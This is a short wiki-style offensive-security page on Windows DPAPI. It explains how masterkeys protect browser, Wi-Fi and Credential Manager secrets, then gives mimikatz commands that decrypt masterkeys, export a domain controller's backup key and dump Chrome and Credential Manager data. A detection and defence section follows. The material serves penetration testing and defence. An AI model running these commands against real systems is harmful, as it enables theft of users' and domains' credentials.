---
title: DPAPI secrets
slug: dpapi-secrets
---

> **TL;DR:** The Data Protection API encrypts user/machine secrets (browser cookies, WiFi PSKs, Credential Manager, RDP creds) with masterkeys derived from the user's password — steal the masterkey, decrypt everything.

## What it is
DPAPI is the Windows subsystem behind `CryptProtectData` / `CryptUnprotectData`. Each user has a chain: SHA1(password) → pre-key → masterkey → blob key. Machine DPAPI (`CRYPTPROTECT_LOCAL_MACHINE`) uses the LSA `DPAPI_SYSTEM` secret instead. Anything sensitive that Microsoft stores at rest — Chrome/Edge cookies and saved logins (the v10/v20 AES key is itself a DPAPI blob), Outlook PST creds, mapped-drive credentials, RDP `.rdg` saved passwords, WiFi `MSM:{...}` keys — uses one of these chains.

## Preconditions / where it applies
- User context with their cleartext password or NT hash → decrypt their masterkeys
- SYSTEM on the host → use the `DPAPI_SYSTEM` LSA secret to decrypt machine masterkeys
- Domain Controller `BackupKey` (RSA private key) → decrypt ANY domain user's masterkey offline, no password needed
- Files: `%APPDATA%\Microsoft\Protect\<SID>\<GUID>` (user masterkeys), `%SystemRoot%\System32\Microsoft\Protect\S-1-5-18\User` (machine)

## Technique
List and decrypt masterkeys with the user's password.

```
mimikatz # dpapi::masterkey /in:C:\Users\bob\AppData\Roaming\Microsoft\Protect\S-1-5-21-.../<GUID> /password:Hunter2!
```

The domain backup-key path is the high-value primitive: as Domain Admin, extract once and decrypt every user's vault forever.

```
mimikatz # lsadump::backupkeys /system:DC01 /export
mimikatz # dpapi::masterkey /in:<masterkey> /pvk:ntds_capi_0_<GUID>.pvk
```

Then unprotect the actual blob (Chrome cookie store, Credential Manager `.cred` file, Vault, WiFi profile, etc.) referencing the masterkey GUID embedded in the blob header:

```
mimikatz # dpapi::cred /in:C:\Users\bob\AppData\Local\Microsoft\Credentials\<GUID> /masterkey:<hex>
mimikatz # dpapi::chrome /in:"...Login Data" /masterkey:<hex>
```

SharpDPAPI / DonPAPI automate end-to-end collection. For browsers using AppBound encryption (Chrome 127+, see [[pkfail-uefi-secureboot-bypass]] unrelated — different feature), DPAPI is still the bootstrap step but an additional COM-elevation hop is required.

## Detection and defence
- Backup-key extraction is rare and high-signal — alert on `lsadump::backupkeys`-style LSARPC calls (`BackuprKey`) to a DC
- Mass reads of `\Microsoft\Protect\<SID>\*` from non-owner processes
- Credential Guard does not protect user DPAPI; rotate user passwords after compromise to invalidate the chain
- Disable browser password sync to local DPAPI where possible; force enterprise password managers
- Audit access to `%APPDATA%\Microsoft\Credentials` and `Vault` directories

## References
- [HackTricks — DPAPI extracting passwords](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) — practical walkthrough
- [SpecterOps — SharpDPAPI](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107) — operator-focused DPAPI abuse
- [Microsoft — DPAPI overview](https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10)) — protocol/chain reference
